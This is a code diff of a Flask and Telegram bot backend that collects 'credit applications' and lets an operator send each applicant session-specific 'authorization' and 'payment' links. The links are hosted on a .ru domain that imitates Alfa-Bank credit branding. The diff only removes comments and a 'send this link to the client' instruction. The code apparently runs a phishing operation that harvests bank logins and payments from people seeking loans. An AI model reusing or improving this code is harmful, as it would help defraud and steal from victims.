@@ -13,7 +13,6 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN")
 ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))
 SITE_URL = os.environ.get("SITE_URL", "https://alfakreditplus.warepointpay.ru")
 
-# ========== БАЗА ДАННЫХ ==========
 def init_db():
     conn = sqlite3.connect('applications.db')
     c = conn.cursor()
@@ -36,7 +35,6 @@ def init_db():
 
 init_db()
 
-# ========== ОТПРАВКА В TELEGRAM ==========
 def send_to_admin(text, keyboard=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     data = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "HTML"}
@@ -53,7 +51,6 @@ def get_keyboard(session_id):
         ]
     }
 
-# ========== ОБРАБОТКА КНОПОК (ВЕБХУК) ==========
 def send_callback_answer(callback_id, text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
     requests.post(url, json={"callback_query_id": callback_id, "text": text})
@@ -79,19 +76,18 @@ def webhook():
             session_id = callback_data.split(':')[1]
             link = f"{SITE_URL}/page_82554/?session={session_id}"
             send_callback_answer(callback_id, "✅ Ссылка на авторизацию")
-            edit_message_text(chat_id, message_id, f"🔐 <b>Ссылка на авторизацию</b>\n\n{link}\n\nОтправьте эту ссылку клиенту.", None)
+            edit_message_text(chat_id, message_id, f"🔐 <b>Ссылка на авторизацию</b>\n\n{link}", None)
             
         elif callback_data.startswith('payment:'):
             session_id = callback_data.split(':')[1]
             link = f"{SITE_URL}/page_63860/?session={session_id}"
             send_callback_answer(callback_id, "✅ Ссылка на оплату")
-            edit_message_text(chat_id, message_id, f"💳 <b>Ссылка на оплату</b>\n\n{link}\n\nОтправьте эту ссылку клиенту.", None)
+            edit_message_text(chat_id, message_id, f"💳 <b>Ссылка на оплату</b>\n\n{link}", None)
             
         elif callback_data.startswith('reject:'):
             session_id = callback_data.split(':')[1]
             send_callback_answer(callback_id, "❌ Заявка отклонена")
             edit_message_text(chat_id, message_id, f"❌ <b>ЗАЯВКА ОТКЛОНЕНА</b>\n\nСессия: {session_id}", None)
-            
             conn = sqlite3.connect('applications.db')
             c = conn.cursor()
             c.execute('UPDATE applications SET status = "rejected" WHERE session_id = ?', (session_id,))
@@ -150,7 +146,6 @@ def webhook():
     
     return jsonify({"status": "ok"})
 
-# ========== ОСНОВНЫЕ ЭНДПОИНТЫ ==========
 @app.route('/submit_credit_application', methods=['POST'])
 def submit_application():
     data = request.json
